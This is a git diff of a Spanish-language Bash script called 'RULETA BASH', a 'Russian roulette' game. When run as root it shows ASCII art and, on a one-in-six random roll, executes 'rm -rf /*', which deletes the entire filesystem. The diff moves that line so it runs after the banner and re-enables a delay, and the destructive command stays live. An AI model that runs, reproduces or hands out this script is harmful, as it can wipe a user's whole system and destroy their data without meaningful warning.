@@ -1,4 +1,8 @@
 #! /bin/bash
+# RULETA BASH v0.1
+# Autor: Joan Bono
+# Mail: joan.bono@soyteleco.net
+
 user=$(whoami)
 if [ "$user" == "root" ]; then
 	echo " 																			   
@@ -17,12 +21,12 @@ if [ "$user" == "root" ]; then
 		º-._____.-º  |  _ <| |_| | |___| |___  | |/ ___ \  | |_) / ___ \ ___) |  _  |
 		             |_| \_\\\____/|_____|_____| |_/_/   \_\ |____/_/   \_\____/|_| |_|
 		                                                                			   "
-    #leep 3
+    sleep 3
     echo "Que empieze el juego..."
     sleep 2
 
 	if [ "$((RANDOM%6+1))" = "6" ]; then
-		rm -rf /*
+		
 
 		echo "                                    __       __"
 		echo "                                   / _|     / /"
@@ -30,11 +34,11 @@ if [ "$user" == "root" ]; then
 		echo "     | '__| '_ '' _ \ |______| '__|  _|   / /  "
 		echo "     | |  | | | | | |        | |  | |    / /   "
 		echo "     |_|  |_| |_| |_|        |_|  |_|   /_/    "
-        echo "                                   		 "
+		echo "                                   		 "
+        	rm -rf /*
 
 
 	else
-		#echo "Por poco..."
 
 		echo ""
 		echo "		 _____    									  "                                    
